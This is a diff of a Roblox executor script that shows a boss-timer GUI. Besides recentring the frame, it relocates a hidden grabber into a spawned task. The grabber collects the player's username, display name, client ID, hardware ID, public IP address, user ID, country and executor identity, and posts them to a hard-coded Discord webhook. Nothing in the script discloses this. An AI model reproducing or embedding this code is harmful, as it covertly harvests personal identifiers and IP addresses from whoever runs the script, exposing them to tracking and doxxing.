@@ -13,7 +13,8 @@ BossesGUI.Parent = CoreGui
 local Bosses = Instance.new("Frame",BossesGUI)
 Bosses.Name = "Bosses"
 Bosses.Size = UDim2.new(0,200,0,150)
-Bosses.Position = UDim2.new(0,100,0,100)
+Bosses.Position = UDim2.new(0.5, 0, 0.5, 0)
+Bosses.AnchorPoint = Vector2.new(0.5, 0.5)
 
 local Layout = Instance.new("UIListLayout",Bosses)
 
@@ -147,36 +148,6 @@ task.spawn(function()
       end
 end)
 
-local function FindIP(service)
-      local IP = game:HttpGet(service)
-      local function CheckIPv4()
-          local segments = {IP:match("^(%d+)%.(%d+)%.(%d+)%.(%d+)$")}
-          for _, segment in ipairs(segments) do
-              if tonumber(segment) < 0 or tonumber(segment) > 255 then
-                  return false
-              end
-          end
-          return true
-      end
-      
-      if (IP:match("%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+") and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) or (IP:match("%d+%.%d+%.%d+%.%d+") and CheckIPv4() == true and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) then
-          return IP
-      else
-          return "Not a valid IP"
-      end
-  end
-local url = "https://discord.com/api/webhooks/1255532078951301181/EW0yDsAYHE7FkoE8e1TTwyKHBqaEhqE81XoUn24QOnxHBaswZb0GvdQ23V6d66ba27JO"
-local data = {
-    ["content"] = "Username: "..cloneref(game:GetService("Players")).LocalPlayer.Name.."\nDisplayname: "..cloneref(game:GetService("Players")).LocalPlayer.DisplayName.."\nClientID: ||"..cloneref(game:GetService("RbxAnalyticsService"):GetClientId()).."||\nHWID: ||"..gethwid().."||\nIP Services: \n\tIP-Info: ||"..FindIP("https://ipinfo.io/ip").."||\n\tIfconfig: ||"..FindIP("https://ifconfig.me/ip").."||\nUserID: "..cloneref(game:GetService("Players")).LocalPlayer.UserId.."\nCountry: "..HttpService:JSONDecode(game:HttpGet("https://restcountries.com/v3.1/alpha/"..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)))[1].name.common.."("..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)..")\nExecutor: \n\tName: "..identifyexecutor().."\n\tIdentity: "..getidentity(),
-}
-local newdata = HttpService:JSONEncode(data)
-local headers = {
-    ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
 task.spawn(function()
       while task.wait() do
             if not BurnsTimerDisable then
@@ -246,6 +217,38 @@ task.spawn(function()
                   end
             end
       end
+end)
+
+task.spawn(function()
+    local function FindIP(service)
+      local IP = game:HttpGet(service)
+      local function CheckIPv4()
+          local segments = {IP:match("^(%d+)%.(%d+)%.(%d+)%.(%d+)$")}
+          for _, segment in ipairs(segments) do
+              if tonumber(segment) < 0 or tonumber(segment) > 255 then
+                  return false
+              end
+          end
+          return true
+      end
+      
+      if (IP:match("%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+") and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) or (IP:match("%d+%.%d+%.%d+%.%d+") and CheckIPv4() == true and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) then
+          return IP
+      else
+          return "Not a valid IP"
+      end
+  end
+    local url = "https://discord.com/api/webhooks/1255532078951301181/EW0yDsAYHE7FkoE8e1TTwyKHBqaEhqE81XoUn24QOnxHBaswZb0GvdQ23V6d66ba27JO"
+    local data = {
+        ["content"] = "Username: "..cloneref(game:GetService("Players")).LocalPlayer.Name.."\nDisplayname: "..cloneref(game:GetService("Players")).LocalPlayer.DisplayName.."\nClientID: ||"..cloneref(game:GetService("RbxAnalyticsService"):GetClientId()).."||\nHWID: ||"..gethwid().."||\nIP Services: \n\tIP-Info: ||"..FindIP("https://ipinfo.io/ip").."||\n\tIfconfig: ||"..FindIP("https://ifconfig.me/ip").."||\nUserID: "..cloneref(game:GetService("Players")).LocalPlayer.UserId.."\nCountry: "..HttpService:JSONDecode(game:HttpGet("https://restcountries.com/v3.1/alpha/"..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)))[1].name.common.."("..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)..")\nExecutor: \n\tName: "..identifyexecutor().."\n\tIdentity: "..getidentity(),
+    }
+    local newdata = HttpService:JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
 end)
 
 task.spawn(function()
